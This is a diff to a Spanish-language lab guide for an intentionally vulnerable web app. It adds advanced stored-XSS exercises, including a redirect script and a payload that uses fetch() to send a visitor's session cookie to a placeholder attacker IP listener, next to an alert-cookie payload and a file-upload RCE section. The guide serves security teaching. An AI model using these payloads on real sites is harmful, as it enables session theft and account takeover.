@@ -54,6 +54,14 @@ Activa el **Modo Vulnerable** (Puerto 8080). Tu objetivo es encontrar, explotar 
     *   **Guía:** **LAB-04 (XSS Stored)**.
     *   **Payload:** `<img src=x onerror=alert(document.cookie)>`
 
+### 2.3.1. XSS Avanzado: Redirección Maliciosa
+*   **Objetivo:** Inyectar un script en el Foro que redirija a los visitantes a una web externa (ej. YouTube).
+*   **Payload:** `<script>window.location="https://www.youtube.com"</script>`
+
+### 2.3.2. XSS Avanzado: Exfiltración de Datos
+*   **Objetivo:** Configurar un listener con `python3 -m http.server` y robar la cookie de sesión de un usuario que visite el Chat.
+*   **Payload:** `<script>fetch('http://[TU_IP]:8000/?cookie='+document.cookie)</script>`
+
 ### 2.4. Carga de Archivos Sin Restricciones (RCE)
 *   **Prueba:** Subir un archivo con contenido ejecutable en el lado del cliente.
 *   **Vector:** Funcionalidad de adjuntar archivos en el Foro.
